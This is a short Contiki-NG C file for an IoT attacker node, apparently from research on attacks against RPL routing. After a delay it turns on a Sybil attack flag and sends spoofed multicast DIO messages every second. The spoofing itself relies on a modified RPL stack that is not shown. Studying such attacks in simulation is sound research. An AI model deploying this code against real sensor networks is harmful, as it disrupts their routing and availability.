#include "contiki.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "sys/log.h"

#define LOG_MODULE "SYBIL-HIGH"
#define LOG_LEVEL LOG_LEVEL_INFO

#define ATTACK_START_DELAY (240 * CLOCK_SECOND)
#define SYBIL_DIO_INTERVAL (CLOCK_SECOND)

/* Strong application definition overrides the disabled weak Contiki default. */
int sybil_attack_enabled = 0;

PROCESS(sybil_high_rate_router_process, "Delayed high-rate Sybil RPL identity attacker");
AUTOSTART_PROCESSES(&sybil_high_rate_router_process);

PROCESS_THREAD(sybil_high_rate_router_process, ev, data)
{
  static struct etimer timer;

  PROCESS_BEGIN();

  LOG_INFO("SYBIL HIGH RATE: started, attack disabled\n");
  etimer_set(&timer, ATTACK_START_DELAY);
  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));

  sybil_attack_enabled = 1;
  LOG_WARN("SYBIL HIGH RATE: enabled, interval 1 second\n");
  etimer_set(&timer, SYBIL_DIO_INTERVAL);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    rpl_icmp6_dio_output(NULL);
    LOG_INFO("SYBIL HIGH RATE: sent spoofed multicast DIO\n");
    etimer_reset(&timer);
  }

  PROCESS_END();
}
